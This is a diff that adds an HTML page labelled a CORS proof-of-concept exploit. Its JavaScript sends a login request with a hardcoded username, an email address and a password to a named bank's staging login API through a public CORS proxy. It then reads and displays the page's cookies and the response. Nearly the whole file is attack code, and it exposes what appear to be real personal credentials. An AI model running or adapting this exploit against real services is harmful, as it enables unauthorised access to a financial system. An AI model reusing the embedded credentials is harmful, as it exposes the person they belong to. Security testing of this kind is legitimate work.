@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<body>
+	<center>
+		<h2>
+			CORS POC EXPLOIT
+		</h2>
+		<div id="demo">
+			<button type="button" onclick="cors()"></button>>
+		</div>
+		<script type="text/javascript">
+			function cors(){
+				var xhttp = new XMLHttpRequest();
+				const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+				var payload = {
+					"DeviceId": "The DeviceId field is required.", 
+					"password": "08017420191ope",
+					"username": "adewoleopw@gmail.com", 
+					"OsVersion": "1",
+					"AppVersion": "1",
+					"MacAddress": "1"
+				}
+				xhttp.onreadystatechange = function() {
+					
+					if (this.readyState == 4 && this.status == 200){
+						const cookies = document.cookie;
+						console.log("cookies are ", cookies);
+						document.getElementById("demo").innerHTML = cookies
+						document.getElementById("demo").innerHTML = alert(this.responseText);
+					}
+				}
+				xhttp.open("POST",proxyUrl+ "https://retailapigateway-staging.kuda.com/kuda-retail-onboardingms/api/v1/Login/InitiateWebLogin", true);
+				xhttp.setRequestHeader("Content-Type", "application/json");
+				xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+				xhttp.setRequestHeader("Credentials", true);
+				xhttp.setRequestHeader("X-Frame-Options", "DENY");
+				xhttp.setRequestHeader("Authorization", "Bearer null");
+				xhttp.setRequestHeader("Credentials", "same-origin");
+				xhttp.setRequestHeader("Accept", "application/json, text/plain, */*");
+				xhttp.send(JSON.stringify(payload));
+			}
+		</script>
+	</center>
+</body>
+</html>>
